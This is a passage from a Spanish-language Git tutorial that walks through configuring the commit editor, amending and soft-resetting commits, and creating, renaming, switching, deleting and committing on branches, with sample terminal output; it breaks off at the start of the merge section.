&lt;p&gt;Generalmente se nos abrira el editor por defecto en nuestro sistema en nuestro caso por defecto se abrira en &lt;code&gt;vim&lt;/code&gt; o &lt;code&gt;nano&lt;/code&gt;, pero si deseamos podemos configurar el editor apra que inicie con otro con el que trabajemos mas comodo.&lt;/p&gt;

&lt;p&gt;Para ello hay varias opciones independientemente si nos encontramos en &lt;code&gt;Linux&lt;/code&gt; o en &lt;code&gt;Windows&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Para &lt;code&gt;Linux&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;Si queremos usar &lt;code&gt;Visual Studio Code&lt;/code&gt; ejecutar:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;$ git config --global core.editor &quot;code --wait&quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Si queremos usar &lt;code&gt;Sublime Text&lt;/code&gt; ejecutar:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;$ git config --global core.editor &quot;subl -n -w&quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Si queremos usar &lt;code&gt;emacs&lt;/code&gt; ejecutar:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;git config --global core.editor emacs
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Para &lt;code&gt;Windows&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;Si queremos usar &lt;code&gt;Visual Studio Code&lt;/code&gt; ejecutar:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;$ git config --global core.editor &quot;code --wait&quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Si queremos usar &lt;code&gt;Sublime Text&lt;/code&gt; ejecutar:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;$ git config --global core.editor &quot;'C:/Program Files (x86)/sublime text 3/subl.exe' -w&quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Si queremos usar &lt;code&gt;Notepad++&lt;/code&gt; ejecutar:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;$ git config --global core.editor &quot;'C:/Program Files (x86)/Notepad++/notepad++.exe' -multiInst -notabbar -nosession -noPlugin&quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Entonces una vez tengamos configurado nuestro editor procedemos a ejecutar &lt;code&gt;git commit&lt;/code&gt; y se procedera a abrirnos nuestro editor de texto. Tal y como nos indicar podemos agregar un mensaje del &lt;code&gt;commit&lt;/code&gt; en una linea sin comentar y guardamos los cambios, pero si deseamos cancelar la operación simplemente el mensaje tiene que estar vacio.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;
# Por favor ingresa el mensaje del commit para tus cambios. Las
#  líneas que comiencen con '#' serán ignoradas, y un mensaje
#  vacío aborta el commit.
#
# En la rama main
# Cambios a ser confirmados:
#	modificados:     archivo_git.txt
#
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Entonces vamos a agregar un mensaje para el &lt;code&gt;commit&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;Cambiar texto a segundo commit
# Por favor ingresa el mensaje del commit para tus cambios. Las
#  líneas que comiencen con '#' serán ignoradas, y un mensaje
#  vacío aborta el commit.
#
# En la rama main
# Cambios a ser confirmados:
#	modificados:     archivo_git.txt
#
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;y automaticamente al guardar y cerrar el archivo, procede a crearse el &lt;code&gt;commit&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git commit
[main bb00766] Cambiar texto a segundo commit
 1 file changed, 1 insertion(+), 1 deletion(-)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora podemos volver a ver el historial de &lt;code&gt;commits&lt;/code&gt; usando &lt;code&gt;git log&lt;/code&gt; y esta vez vemos los dos &lt;code&gt;commits&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git log
commit bb007665d2356b9531ce10be913fd26a27e757da (HEAD -&amp;gt; main)
Author: Firtsmiracle &amp;lt;firtsmiracle@hotmail.com&amp;gt;
Date:   Mon Apr 10 20:13:55 2023 +0000

    Cambiar texto a segundo commit

commit 0143452c010ede2332f5c1b8bad7815743770a2a
Author: Firtsmiracle &amp;lt;firtsmiracle@hotmail.com&amp;gt;
Date:   Mon Apr 10 18:43:50 2023 +0000

    agregar mi archivo de texto
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;cambiar-descripción-del-commit&quot;&gt;Cambiar Descripción del Commit &lt;a href=&quot;#cambiar-descripción-del-commit&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Supongamos que creamos un &lt;code&gt;commit&lt;/code&gt;, pero vimos que pudimos tener un error de tipeo o el mensaje no es muy descriptivo. Pues podemos modificar el ultimo &lt;code&gt;commit&lt;/code&gt; usando el comando &lt;code&gt;git commit --amend&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git commit --amend
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Al ejecutar se nos vuelve a abrir el editor de texto con la descripción que habiamos ingresado&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;Cambiar texto a segundo commit

# Por favor ingresa el mensaje del commit para tus cambios. Las
#  líneas que comiencen con '#' serán ignoradas, y un mensaje
#  vacío aborta el commit.
#
# Fecha:     Mon Apr 10 20:13:55 2023 +0000
#
# En la rama main
# Cambios a ser confirmados:
#	modificados:     archivo_git.txt
#
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Para modificarlo solo debemos modificar el mensaje, guardar y cerrar el archivo.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;Cambiar el contenido de mi commit

# Por favor ingresa el mensaje del commit para tus cambios. Las
#  líneas que comiencen con '#' serán ignoradas, y un mensaje
#  vacío aborta el commit.
#
# Fecha:     Mon Apr 10 20:13:55 2023 +0000
#
# En la rama main
# Cambios a ser confirmados:
#	modificados:     archivo_git.txt
#
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Regresamos a donde ejecutamos el comando y vemos que se actualizo correctamente.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git commit --amend
[main 222c488] Cambiar el contenido de mi commit
 Date: Mon Apr 10 20:13:55 2023 +0000
 1 file changed, 1 insertion(+), 1 deletion(-)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Para verificar que se actualizo el &lt;code&gt;commit&lt;/code&gt; en el historial usamos &lt;code&gt;git log&lt;/code&gt;, pero esta vez agregaremos el parametro &lt;code&gt;--oneline&lt;/code&gt; para acortar la información mostrada.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git log --oneline
222c488 (HEAD -&amp;gt; main) Cambiar el contenido de mi commit
0143452 agregar mi archivo de texto
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Y vemos que fue modificado con exito.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Es importante saber que si vamos a ejecutar el comando &lt;code&gt;git commit --amend&lt;/code&gt; lo hagamos en nuestro &lt;code&gt;repositorio local&lt;/code&gt; no en uno remoto ya que puede ser riesgoso si lo hacemos en proyectos que ya estan siendo usados por otros desarrolladores.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Como consejo hay que tratar siempre de ingresar la descripción o mensaje correcto al &lt;code&gt;commit&lt;/code&gt; para evitar realizar este proceso&lt;/p&gt;

&lt;h2 id=&quot;revertir-commits&quot;&gt;Revertir Commits &lt;a href=&quot;#revertir-commits&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Suele pasar en ocasiones cuando estamos trabajando en algun proyecto y al crear un &lt;code&gt;commit&lt;/code&gt; nos damos cuenta de que nos faltaba agregar algo. Si queremos revertir los cambios hechos por un &lt;code&gt;commit&lt;/code&gt;, podemos hacerlo de forma tal que no se afecten los archivos.&lt;/p&gt;

&lt;p&gt;Para realizar esto el comando que debemos ejecutar es &lt;code&gt;git reset --soft HEAD~1&lt;/code&gt;, donde con el parametro &lt;code&gt;soft&lt;/code&gt; podemos reiniciarlo de modo que los archivos no se modifiquen en el directorio de trabajo. Solo se va a deshacer el registro del &lt;code&gt;commit&lt;/code&gt;, en este caso con &lt;code&gt;HEAD~1&lt;/code&gt; indicaremos al ultimo &lt;code&gt;commit&lt;/code&gt; que se realizo.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git reset --soft HEAD~1
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Una vez ejecutamos el comando, visiblemente no vemos ningun cambio, pero si volvemos a ver el historial de &lt;code&gt;commits&lt;/code&gt;, solo vemos el primer &lt;code&gt;commit&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git log
commit 0143452c010ede2332f5c1b8bad7815743770a2a (HEAD -&amp;gt; main)
Author: Firtsmiracle &amp;lt;firtsmiracle@hotmail.com&amp;gt;
Date:   Mon Apr 10 18:43:50 2023 +0000

    agregar mi archivo de texto
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Y si volvemos a leer el archivo, aún mantiene el contenido con los cambios que habiamos realizado&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ /bin/cat archivo_git.txt
Este es mi segundo commit
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Pero que pasa si volvemos a modificar el archivo&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ /bin/cat archivo_git.txt
Este es mi segundo commit pero modificado
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;º
y volvemos a ejecutar &lt;code&gt;git status&lt;/code&gt;, vemos cambios listos para ser agregados y otros que aun no estan listos.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git status
En la rama main
Cambios a ser confirmados:
  (usa &quot;git restore --staged &amp;lt;archivo&amp;gt;...&quot; para sacar del área de stage)
	modificados:     archivo_git.txt

Cambios no rastreados para el commit:
  (usa &quot;git add &amp;lt;archivo&amp;gt;...&quot; para actualizar lo que será confirmado)
  (usa &quot;git restore &amp;lt;archivo&amp;gt;...&quot; para descartar los cambios en el directorio de trabajo)
	modificados:     archivo_git.txt
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Como deshicimos el ultimo &lt;code&gt;commit&lt;/code&gt; lo que quiere decir que el cambio a de ese ultimo &lt;code&gt;commit&lt;/code&gt; que borramos, aún no es parte del repositorio. Para agregar todos esos cambios lo que podemos hacer es ejecutar el comando &lt;code&gt;git add .&lt;/code&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Con &lt;code&gt;git add .&lt;/code&gt; podemos agregar todos los cambios al &lt;code&gt;area de preparación&lt;/code&gt;, sin necesidad de ejecutar cada archivo.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git add .
❯ git status
En la rama main
Cambios a ser confirmados:
  (usa &quot;git restore --staged &amp;lt;archivo&amp;gt;...&quot; para sacar del área de stage)
	modificados:     archivo_git.txt
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora si queremos crear este &lt;code&gt;commit&lt;/code&gt;, volvemos a ejecutar &lt;code&gt;git commit&lt;/code&gt; y asignamos un mensaje mas especifico&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;Actualizar teto del segundo commit modificado
# Por favor ingresa el mensaje del commit para tus cambios. Las
#  líneas que comiencen con '#' serán ignoradas, y un mensaje
#  vacío aborta el commit.
#
# En la rama main
# Cambios a ser confirmados:
#	modificados:     archivo_git.txt
#
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Guardamos y cerramos y ya tendriamos creado este nuevo &lt;code&gt;commit&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git commit
[main 415796f] Actualizar teto del segundo commit modificado
 1 file changed, 1 insertion(+), 1 deletion(-)
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;branch-ramas&quot;&gt;Branch - Ramas &lt;a href=&quot;#branch-ramas&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Un &lt;code&gt;branch&lt;/code&gt; es una linea independiente de desarrollo en el repositorio, gracias a estas podemos tener copias del &lt;code&gt;branch&lt;/code&gt; principal y que estas vallan evolucionando o cambiando independientemente sin afectar al &lt;code&gt;branch&lt;/code&gt; principal.&lt;/p&gt;

&lt;p&gt;El concepto es similar a las ramas de un arbol, donde tenemos como branch o rama principal &lt;code&gt;main&lt;/code&gt; o &lt;code&gt;master&lt;/code&gt; y desde ahi podemos crear otras subramas que en algun  momento si queremos podemos convinar.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-04-09-Git/ramas.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Supongamos que tenemos una linea actual del proyecto, pero queremos agregarle nuevas funcionalidades como una nueva sección o cambiar algo para ver su funcionamiento. Pues si creamos un nuevo &lt;code&gt;branch&lt;/code&gt; podemos realizar nuestros cambios sin afectar la versión que actualmente este activo.&lt;/p&gt;

&lt;p&gt;Una vez que el &lt;code&gt;branch&lt;/code&gt; alterno a evolucionado con todos los cambios correspondientes, podemos combinarla con el &lt;code&gt;branch&lt;/code&gt; principal.&lt;/p&gt;

&lt;h3 id=&quot;creación-de-un-branch&quot;&gt;Creación de un Branch &lt;a href=&quot;#creación-de-un-branch&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;Para poder crear un nuevo &lt;code&gt;branch&lt;/code&gt; debemos ejecutar el comando &lt;code&gt;git branch&lt;/code&gt; y seguidamente el nombre de la rama que queremos crear&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git branch primer-branch-alterno
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;y ahora para visualizar los &lt;code&gt;branch&lt;/code&gt; que tenemos usamos unicamente el comando &lt;code&gt;git branch&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git branch
* main
  primer-branch-alterno
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;El comandos nos muestra que ahora tenemos dos &lt;code&gt;branch&lt;/code&gt;, el principal que teniamos &lt;code&gt;main&lt;/code&gt; y ahora el nuevo que creamos &lt;code&gt;primer-branch-alterno&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&quot;moverse-de-branch&quot;&gt;Moverse de Branch &lt;a href=&quot;#moverse-de-branch&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;Si queremos desplazarnos de un &lt;code&gt;branch&lt;/code&gt; a otro debemos ejecutar el comando &lt;code&gt;git checkout&lt;/code&gt; y seguido el nombre del &lt;code&gt;branch&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git checkout primer-branch-alterno
Cambiado a rama 'primer-branch-alterno'
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Para confirmar que nos cambiamos a ese nuevo &lt;code&gt;branch&lt;/code&gt; volvemos a ejecutar &lt;code&gt;git branch&lt;/code&gt; y esta vez nos selecciona el &lt;code&gt;branch&lt;/code&gt; alterno&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git branch
  main
* primer-branch-alterno
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora existe una forma de agilizar este proceso de creación y desplazamiento de un &lt;code&gt;branch&lt;/code&gt; para ello debemos ejecutar &lt;code&gt;git checkout -b&lt;/code&gt; y seguido el nombre de la rama. Pero es importante antes de ejecutar el comando volver a nuestro &lt;code&gt;branch&lt;/code&gt; original &lt;code&gt;main&lt;/code&gt; ya que nos encontramos en el &lt;code&gt;branch&lt;/code&gt; &lt;code&gt;primer-branch-alterno&lt;/code&gt; y nosotros queremos crear el &lt;code&gt;branch&lt;/code&gt; a partir de el &lt;code&gt;branch&lt;/code&gt; principal.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git checkout main
Cambiado a rama 'main'
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;y ahora si podemos ejecutar el comando y visializamos que efectivamente nos encontramos en el nuevo &lt;code&gt;branch&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git checkout -b segundo-branch-alterno
Cambiado a nueva rama 'segundo-branch-alterno'
❯ git branch
  main
  primer-branch-alterno
* segundo-branch-alterno
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;cambiar-nombre-al-branch&quot;&gt;Cambiar Nombre al Branch &lt;a href=&quot;#cambiar-nombre-al-branch&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;Para cambiar el nombre de un &lt;code&gt;branch&lt;/code&gt; existen dos metodos:&lt;/p&gt;

&lt;p&gt;En el primero debemos estar en el &lt;code&gt;branch&lt;/code&gt; que deseamos cambiar el nombre, para este caso queremos cambiar el nombre de &lt;code&gt;primer-branch-alterno&lt;/code&gt; a &lt;code&gt;primer-branch&lt;/code&gt; y ejecutar el comando &lt;code&gt;git branch -m&lt;/code&gt; y seguidamente el nuevo nombre a asignar.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git checkout primer-branch-alterno
Cambiado a rama 'primer-branch-alterno'
git branch -m primer-branch
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Verificamos los cambios usando &lt;code&gt;git branch&lt;/code&gt;y efectivamente nos modifico el nombre&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git branch
  main
* primer-branch
  segundo-branch-alterno
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Si queremos usar el segundo metodo no es necesario estar en el &lt;code&gt;branch&lt;/code&gt; que deseamos cambiar, tan solo hay que ejecutar &lt;code&gt;git branch -m&lt;/code&gt;, seguidamente el nombre del &lt;code&gt;branch&lt;/code&gt; que deseamos cambiar &lt;code&gt;segundo-branch-alterno&lt;/code&gt; y despues el nuevo nombre que se le asignara &lt;code&gt;segundo-branch&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git branch -m segundo-branch-alterno segundo-branch
❯ git branch
  main
* primer-branch
  segundo-branch
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&quot;eliminar-un-branch&quot;&gt;Eliminar un Branch &lt;a href=&quot;#eliminar-un-branch&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;Una vez que combinamos los cambios que realizamos en los &lt;code&gt;branchs&lt;/code&gt; o si las creamos por error, podemos eliminarlos.&lt;/p&gt;

&lt;p&gt;Si deseamos eliminar el &lt;code&gt;branch&lt;/code&gt;, hay que ejecutar el comando &lt;code&gt;git branch -d&lt;/code&gt; y seguidamente el nombre del &lt;code&gt;branch&lt;/code&gt; que queramos borrar.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git branch -d segundo-branch
Eliminada la rama segundo-branch (era 415796f).
❯ git branch
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Verificamos si se realizaron los cambios y se borro el &lt;code&gt;branch&lt;/code&gt; con exito.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git branch
  main
* primer-branch
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
  &lt;p&gt;Este comando aplica a &lt;code&gt;branch&lt;/code&gt; en repositorios locales no en &lt;code&gt;branch&lt;/code&gt; que se encuentren publicadas.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;crear-commits-en-un-branch&quot;&gt;Crear Commits en un Branch &lt;a href=&quot;#crear-commits-en-un-branch&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;Veamos como podemos crear un &lt;code&gt;commit&lt;/code&gt; en un &lt;code&gt;branch&lt;/code&gt; que no sea &lt;code&gt;main&lt;/code&gt; que nosotros creemos y veremos como podemos cambiar entre estos &lt;code&gt;branch&lt;/code&gt; para ver como nuestros archivos cambian en nuestros directorios de trabajo.&lt;/p&gt;

&lt;p&gt;Esta parte es excelente, paece magia negra xD!&lt;/p&gt;

&lt;p&gt;Bueno sabemos que tenemos un archivo de texto en nuestro directorio llamado &lt;code&gt;archivo_git.txt&lt;/code&gt; con un cotenido asignado.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ls
 archivo_git.txt
❯ /bin/cat archivo_git.txt
Este es mi segundo commit pero modificado
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Ahora nos encontramos en nuestro &lt;code&gt;branch&lt;/code&gt; principal &lt;code&gt;main&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git branch
* main
  primer-branch
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Primero para realizar un cambio nos vamos a mover a nuestro &lt;code&gt;branch&lt;/code&gt; alterno &lt;code&gt;primer-branch&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git checkout primer-branch
Cambiado a rama 'primer-branch
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Una vez nos en este &lt;code&gt;branch&lt;/code&gt; leemos el archivo que tenemos.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;❯ /bin/cat archivo_git.txt
Este es mi segundo commit pero modificado
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Podemos ver que el contenido es el mismo, entonces ahora vamos a modificarlo.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ /bin/cat archivo_git.txt
Hola Git
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Veamos ahora que ocurre si ejecutamos &lt;code&gt;git status&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git status
En la rama primer-branch
Cambios no rastreados para el commit:
  (usa &quot;git add &amp;lt;archivo&amp;gt;...&quot; para actualizar lo que será confirmado)
  (usa &quot;git restore &amp;lt;archivo&amp;gt;...&quot; para descartar los cambios en el directorio de trabajo)
	modificados:     archivo_git.txt

sin cambios agregados al commit (usa &quot;git add&quot; y/o &quot;git commit -a&quot;)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Nos muestra que estamos en el &lt;code&gt;branch&lt;/code&gt; alterno &lt;code&gt;primer-branch&lt;/code&gt; y que tenemos cambios que aún no han sido preparados para el proximo &lt;code&gt;commit&lt;/code&gt;. Entonces para agregsarlo ejecutamos el comando &lt;code&gt;git add .&lt;/code&gt; para agregarlos.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git add .
❯ git status
En la rama primer-branch
Cambios a ser confirmados:
  (usa &quot;git restore --staged &amp;lt;archivo&amp;gt;...&quot; para sacar del área de stage)
	modificados:     archivo_git.txt
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Esta vez aun estamos en el &lt;code&gt;branch&lt;/code&gt; alterno &lt;code&gt;primer-branch&lt;/code&gt;, pero si tenemos el archivo en el &lt;code&gt;area de preparación&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Procedemos a crear nuestro &lt;code&gt;commit&lt;/code&gt; con &lt;code&gt;git commit&lt;/code&gt; y se nos abre nuestro editor de texto, en el cual introduciremos la descripción de este nuevo &lt;code&gt;commit&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;Cambiar texto a Hola Git
# Por favor ingresa el mensaje del commit para tus cambios. Las
#  líneas que comiencen con '#' serán ignoradas, y un mensaje
#  vacío aborta el commit.
#
# En la rama primer-branch
# Cambios a ser confirmados:
#	modificados:     archivo_git.txt
#
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Guardamos y cerramos el editor y tendriamos un nuevo &lt;code&gt;commit&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git commit
[primer-branch 9771c56] Cambiar texto a Hola Git
 1 file changed, 1 insertion(+), 1 deletion(-)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vamos a leer el archivo otra vez, recordar que estamos en el &lt;code&gt;branch&lt;/code&gt; alterno &lt;code&gt;primer-branch&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ /bin/cat archivo_git.txt
Hola Git
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;efectivamente vemos los cambios que realizamos, pero que pasa si ahora vamos a nuestro &lt;code&gt;branch&lt;/code&gt; principal &lt;code&gt;main&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git checkout main
Cambiado a rama 'main'
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Una vez aqui voy a leer mi archivo &lt;code&gt;archivo_git.txt&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ /bin/cat archivo_git.txt
Este es mi segundo commit pero modificado
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;y pumm! wala!! se tenso la cosa, tenemos el contenido antes de realizar el &lt;code&gt;commit&lt;/code&gt; en el &lt;code&gt;branch&lt;/code&gt; alterno. Esto es super genial por que estamos trabajando con el mismo archivo, pero con dos versiones diferentes :).&lt;/p&gt;

&lt;h3 id=&quot;historial-de-commits-en-branchs&quot;&gt;Historial de Commits en Branchs &lt;a href=&quot;#historial-de-commits-en-branchs&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;Primeramente vamos a ejecutar el comando &lt;code&gt;git log&lt;/code&gt; con el parametro &lt;code&gt;--oneline&lt;/code&gt; para acortar la información.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git log --oneline
415796f (HEAD -&amp;gt; main) Actualizar teto del segundo commit modificado
0143452 agregar mi archivo de texto
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Podemos ver el historial de &lt;code&gt;commits&lt;/code&gt; en &lt;code&gt;main&lt;/code&gt;, pero no vemos el &lt;code&gt;commit&lt;/code&gt; que realizamos en el &lt;code&gt;branch&lt;/code&gt; alterno &lt;code&gt;primer-branch&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Vamos a irnos a el &lt;code&gt;branch&lt;/code&gt; alterno con &lt;code&gt;git checkout&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git log --oneline
9771c56 (HEAD -&amp;gt; primer-branch) Cambiar texto a Hola Git
415796f (main) Actualizar teto del segundo commit modificado
0143452 agregar mi archivo de texto
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Nos damos cuenta que ambos &lt;code&gt;branch&lt;/code&gt; comparten los ultimos dos &lt;code&gt;commits&lt;/code&gt;, pero despues al crearse el &lt;code&gt;branch&lt;/code&gt; alterno el primer &lt;code&gt;commit&lt;/code&gt; que se creo fue el primero. Por eso este &lt;code&gt;branch&lt;/code&gt; muestra este nuevo &lt;code&gt;commit&lt;/code&gt; y el &lt;code&gt;branch&lt;/code&gt; principal &lt;code&gt;main&lt;/code&gt; no, ya que el primer &lt;code&gt;commit&lt;/code&gt; pertener a este nuevo &lt;code&gt;branch&lt;/code&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Debo mencionar que existe un comando el cual muestra los &lt;code&gt;commit&lt;/code&gt; y cual fue la diferencia que introdujo el &lt;code&gt;commit&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git log -p
commit 9771c563effc6eb6a82ed94947c125fdbdd03233 (HEAD -&amp;gt; primer-branch)
Author: Firtsmiracle &amp;lt;firtsmiracle@hotmail.com&amp;gt;
Date:   Mon Apr 10 21:46:43 2023 +0000

    Cambiar texto a Hola Git

diff --git a/archivo_git.txt b/archivo_git.txt
index cf36484..0152d71 100644
--- a/archivo_git.txt
+++ b/archivo_git.txt
@@ -1 +1 @@
-Este es mi segundo commit pero modificado
+Hola Git
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;merge-fusionar-branchs&quot;&gt;Merge - Fusionar Branchs &lt;a href=&quot;#merge-fusionar-branchs&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;Ya que los &lt;code&gt;branchs&lt;/code&gt; son temporales, debido a que existen miestras estamos desarrollando alguna funcionalidad o corrigiendo un problema, llegara un momento en que debamos fusionar esos cambios con el &lt;code&gt;branch&lt;/code&gt; principal, este proceso se denomina &lt;code&gt;merge&lt;/code&gt;&lt;/p&gt;

&lt;blockquote&gt;
